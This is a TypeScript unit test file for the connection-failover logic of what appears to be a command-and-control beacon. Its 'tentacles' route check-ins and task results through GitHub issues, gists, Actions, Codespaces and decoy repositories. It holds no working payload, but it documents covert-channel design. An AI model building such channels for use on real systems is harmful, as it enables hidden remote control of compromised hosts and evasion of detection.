import { describe, it, expect } from "bun:test";
import { ConnectionFactory } from "../factory/ConnectionFactory.ts";
import type {
  CheckinPayload,
  ITentacle,
  ResultSubmissionOutcome,
  TaskResult,
  TentacleKind,
} from "../types.ts";

function proxyLease(owner: string, repo: string) {
  return {
    version: 1 as const,
    leaseId: `lease-${repo}`,
    beaconId: "test-beacon",
    installationId: 99,
    token: `ghs-${repo}`,
    repository: { owner, repo },
    permissions: {
      metadata: "read" as const,
      issues: "write" as const,
      variables: "read" as const,
    },
    issuedAt: "2026-07-16T12:00:00.000Z",
    renewAfter: "2026-07-16T12:50:00.000Z",
    expiresAt: "2026-07-16T13:00:00.000Z",
  };
}

function makeConfig(
  priority: TentacleKind[] | Partial<{ tentaclePriority: TentacleKind[]; proxyRepos: import("../types.ts").ProxyConfig[] }> = ["issues"]
) {
  if (Array.isArray(priority)) {
    return {
      id: "test-beacon",
      repo: { owner: "owner", name: "repo" },
      token: "tok",
      tentaclePriority: priority,
      sleepSeconds: 60,
      jitter: 0.3,
      operatorPublicKey: new Uint8Array(32),
      beaconKeyPair: { publicKey: new Uint8Array(32), secretKey: new Uint8Array(32) },
    };
  }
  return {
    id: "test-beacon",
    repo: { owner: "owner", name: "repo" },
    token: "tok",
    tentaclePriority: priority.tentaclePriority ?? ["issues"],
    sleepSeconds: 60,
    jitter: 0.3,
    operatorPublicKey: new Uint8Array(32),
    beaconKeyPair: { publicKey: new Uint8Array(32), secretKey: new Uint8Array(32) },
    ...(priority.proxyRepos !== undefined && { proxyRepos: priority.proxyRepos }),
  };
}

function makeTentacle(kind: TentacleKind, available: boolean): ITentacle {
  return {
    kind,
    isAvailable: async () => available,
    checkin: async () => [],
    submitResult: async () => ({
      artifactWritten: false,
      controllerAccepted: false,
      channel: kind,
      acceptance: null,
    }),
    teardown: async () => {},
  };
}

function makeSubmissionTentacle(
  kind: TentacleKind,
  submit: () => Promise<ResultSubmissionOutcome>,
): ITentacle {
  return {
    kind,
    isAvailable: async () => true,
    checkin: async () => [],
    submitResult: submit,
    teardown: async () => {},
  };
}

const DUMMY_PAYLOAD: CheckinPayload = {
  beaconId: "x", publicKey: "", hostname: "", username: "",
  os: "", arch: "", pid: 1, checkinAt: "",
};

const DUMMY_RESULT: TaskResult = {
  taskId: "task-1",
  beaconId: "test-beacon",
  success: true,
  output: "ok",
  completedAt: "2026-07-16T12:00:00.000Z",
};

describe("ConnectionFactory.isFullyExhausted", () => {
  it("returns true when no tentacles are registered", () => {
    const f = new ConnectionFactory({ config: makeConfig() });
    expect(f.isFullyExhausted()).toBe(true);
  });

  it("returns false when a tentacle is active", () => {
    const f = new ConnectionFactory({ config: makeConfig() });
    f.register(makeTentacle("issues", true));
    expect(f.isFullyExhausted()).toBe(false);
  });

  it("returns false when a tentacle is degraded (< maxFailures)", async () => {
    const f = new ConnectionFactory({ config: makeConfig(), maxFailures: 5 });
    f.register(makeTentacle("issues", false));
    await f.checkin(DUMMY_PAYLOAD);   // 1 failure → degraded, not cooldown
    expect(f.isFullyExhausted()).toBe(false);
  });

  it("returns true when all tentacles are in cooldown", async () => {
    const f = new ConnectionFactory({
      config: makeConfig(),
      maxFailures: 1,
      degradedCooldownMs: 60_000,
    });
    f.register(makeTentacle("issues", false));
    await f.checkin(DUMMY_PAYLOAD);   // 1 failure → immediately cooldown (maxFailures=1)
    expect(f.isFullyExhausted()).toBe(true);
  });

  it("returns false when cooldown has expired", async () => {
    const f = new ConnectionFactory({
      config: makeConfig(),
      maxFailures: 1,
      degradedCooldownMs: 0,   // expires immediately
    });
    f.register(makeTentacle("issues", false));
    await f.checkin(DUMMY_PAYLOAD);
    expect(f.isFullyExhausted()).toBe(false);
  });

  it("returns true when all tentacles are disabled", async () => {
    const f = new ConnectionFactory({ config: makeConfig(), maxFailures: 1, degradedCooldownMs: 60_000 });
    f.register(makeTentacle("issues", false));
    await f.checkin(DUMMY_PAYLOAD);
    // Force to disabled state via internal access
    const entry = (f as any).registry.get("issues");
    entry.state = "disabled";
    expect(f.isFullyExhausted()).toBe(true);
  });
});

describe("ConnectionFactory.setProxyTentacles", () => {
  it("preserves all proxy tentacles — none overwritten by Map key collision", async () => {
    // Simulate what rebuildFactory() does when 2 proxy repos are configured:
    // setProxyTentacles() must keep both, not just the last one.
    const config = makeConfig({ tentaclePriority: ["proxy"], proxyRepos: [] });
    const factory = new ConnectionFactory({ config });

    const proxy1 = makeTentacle("proxy", true);
    const proxy2 = makeTentacle("proxy", true);

    factory.setProxyTentacles([proxy1, proxy2]);

    // Both proxies should be tried during checkin (track which ones were called)
    let called = 0;
    const trackingProxy1: ITentacle = {
      ...proxy1,
      isAvailable: async () => { called++; return false; },
    };
    const trackingProxy2: ITentacle = {
      ...proxy2,
      isAvailable: async () => { called++; return false; },
    };

    factory.setProxyTentacles([trackingProxy1, trackingProxy2]);
    await factory.checkin(DUMMY_PAYLOAD);

    expect(called).toBe(2);
  });

  it("replaces previously set proxy tentacles on second call", () => {
    const config = makeConfig({ tentaclePriority: ["proxy"], proxyRepos: [] });
    const factory = new ConnectionFactory({ config });

    const proxy1 = makeTentacle("proxy", true);
    factory.setProxyTentacles([proxy1]);

    const proxy2 = makeTentacle("proxy", true);
    const proxy3 = makeTentacle("proxy", true);
    factory.setProxyTentacles([proxy2, proxy3]);

    // Internal proxyEntries should reflect the latest call only
    const entries = (factory as any).proxyEntries as Array<{ tentacle: ITentacle }>;
    expect(entries).toHaveLength(2);
    expect(entries[0]!.tentacle).toBe(proxy2);
    expect(entries[1]!.tentacle).toBe(proxy3);
  });
});

describe("ConnectionFactory.getTentacles (proxy)", () => {
  it("creates the configured OctoProxyTentacle", () => {
    const config = makeConfig({
      tentaclePriority: ["proxy"],
      proxyRepos: [
        {
          owner: "decoy1",
          repo: "fake-dots",
          innerKind: "issues",
          decoyIssue: 7,
          githubTokenLease: proxyLease("decoy1", "fake-dots"),
        },
      ],
    });
    const factory = new ConnectionFactory({ config });
    const tentacles = factory.getTentacles();
    const proxies = tentacles.filter(t => t.kind === "proxy");
    expect(proxies).toHaveLength(1);
  });

  it("rejects multiple proxy routes for the same beacon", () => {
    const route = {
      owner: "decoy1",
      repo: "fake-dots",
      innerKind: "issues" as const,
      decoyIssue: 7,
      githubTokenLease: proxyLease("decoy1", "fake-dots"),
    };
    const config = makeConfig({
      tentaclePriority: ["proxy"],
      proxyRepos: [
        route,
        {
          ...route,
          owner: "decoy2",
          repo: "other",
          decoyIssue: 8,
          githubTokenLease: proxyLease("decoy2", "other"),
        },
      ],
    });
    const factory = new ConnectionFactory({ config });
    expect(() => factory.getTentacles()).toThrow("At most one proxy route");
  });

  it("creates no proxy tentacles when proxyRepos is empty", () => {
    const config = makeConfig({
      tentaclePriority: ["proxy"],
      proxyRepos: [],
    });
    const factory = new ConnectionFactory({ config });
    expect(factory.getTentacles().filter(t => t.kind === "proxy")).toHaveLength(0);
  });
});

describe("ConnectionFactory.teardown", () => {
  it("resets bootstrapped so the next checkin shows [bootstrap] logs", async () => {
    const f = new ConnectionFactory({ config: makeConfig() });
    f.register(makeTentacle("issues", true));
    await f.checkin(DUMMY_PAYLOAD);
    // After a successful checkin, bootstrapped is true — [bootstrap] logs stop
    await f.teardown();
    // Re-register and checkin again — bootstrap should reappear
    f.register(makeTentacle("issues", true));
    // We verify indirectly: isFullyExhausted should be false after re-register
    expect(f.isFullyExhausted()).toBe(false);
  });
});

describe("ConnectionFactory.submitResult", () => {
  it("falls through an async written-but-unaccepted artifact to a direct accepted transport", async () => {
    const calls: TentacleKind[] = [];
    const factory = new ConnectionFactory({
      config: makeConfig(["actions", "codespaces"]),
    });
    factory.register(makeSubmissionTentacle("actions", async () => {
      calls.push("actions");
      return {
        artifactWritten: true,
        controllerAccepted: false,
        channel: "actions",
        acceptance: null,
      };
    }));
    factory.register(makeSubmissionTentacle("codespaces", async () => {
      calls.push("codespaces");
      return {
        artifactWritten: true,
        controllerAccepted: true,
        channel: "codespaces",
        acceptance: "direct-response",
      };
    }));

    await expect(factory.submitResult(DUMMY_RESULT)).resolves.toEqual({
      artifactWritten: true,
      controllerAccepted: true,
      channel: "codespaces",
      acceptance: "direct-response",
    });
    expect(calls).toEqual(["actions", "codespaces"]);
  });

  it("aggregates written artifacts when no transport obtains controller acceptance", async () => {
    const factory = new ConnectionFactory({
      config: makeConfig(["actions", "gist"]),
    });
    factory.register(makeSubmissionTentacle("actions", async () => ({
      artifactWritten: true,
      controllerAccepted: false,
      channel: "actions",
      acceptance: null,
    })));
    factory.register(makeSubmissionTentacle("gist", async () => ({
      artifactWritten: true,
      controllerAccepted: false,
      channel: "gist",
      acceptance: null,
    })));

    await expect(factory.submitResult(DUMMY_RESULT)).resolves.toEqual({
      artifactWritten: true,
      controllerAccepted: false,
      channel: "gist",
      acceptance: null,
    });
  });

  it("fails over when a transport throws during result submission", async () => {
    const calls: TentacleKind[] = [];
    const factory = new ConnectionFactory({
      config: makeConfig(["issues", "codespaces"]),
    });
    factory.register(makeSubmissionTentacle("issues", async () => {
      calls.push("issues");
      throw new Error("transport unavailable");
    }));
    factory.register(makeSubmissionTentacle("codespaces", async () => {
      calls.push("codespaces");
      return {
        artifactWritten: true,
        controllerAccepted: true,
        channel: "codespaces",
        acceptance: "direct-response",
      };
    }));

    await expect(factory.submitResult(DUMMY_RESULT)).resolves.toEqual({
      artifactWritten: true,
      controllerAccepted: true,
      channel: "codespaces",
      acceptance: "direct-response",
    });
    expect(calls).toEqual(["issues", "codespaces"]);
  });
});
